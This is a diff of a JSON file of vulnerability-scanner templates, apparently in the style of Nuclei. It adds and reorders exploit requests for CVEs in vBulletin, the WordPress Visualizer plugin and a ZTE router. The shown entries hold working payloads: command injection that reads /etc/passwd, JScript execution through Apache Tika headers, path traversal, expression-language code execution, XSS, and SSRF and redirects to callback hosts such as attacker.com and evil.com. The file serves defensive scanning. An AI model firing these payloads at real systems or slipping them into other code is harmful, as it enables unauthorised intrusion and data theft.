@@ -6314,11 +6314,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -7343,6 +7343,22 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-6200",
+      "info": {
+        "name": "vBulletin 3.x.x & 4.2.x - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/redirector.php?url=https://attacker.com",
+            "{{BaseURL}}/redirector.php?do=nodelay&url=https://attacker.com"
           ]
         }
       ]
@@ -8440,6 +8456,39 @@
             "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}\n\nhtml_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384\n",
             "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/login_pic.asp\nCookie: uid=1234123\n\nhtml_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('cat /etc/passwd')}}\n",
             "POST /apply_sec.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/login_pic.asp\nCookie: uid=1234123\n\nhtml_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('type C:\\\\Windows\\\\win.ini')}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-16931",
+      "info": {
+        "name": "Visualizer < 3.3.1 - Stored Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-json/visualizer/v1/update-chart HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"id\": 7, \"visualizer-chart-type\": \"<script>alert(document.domain)</script>\"}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-16932",
+      "info": {
+        "name": "Visualizer < 3.3.1 - Blind Server-Side Request Forgery (SSRF)",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "body": "{\\\"url\\\":\\\"http://{{interactsh-url}}\\\"}",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/wp-json/visualizer/v1/upload-data"
           ]
         }
       ]
@@ -10620,8 +10669,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -12876,6 +12925,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/Schemas/$%7B''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')%7D"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21745",
+      "info": {
+        "name": "ZTE MF971R - Referer authentication bypass",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /goform/goform_get_cmd_process?cmd=psw_fail_num_str HTTP/1.1\nHost: {{Hostname}}\nReferer: http://evil.com/127.0.0.1.html\n"
           ]
         }
       ]
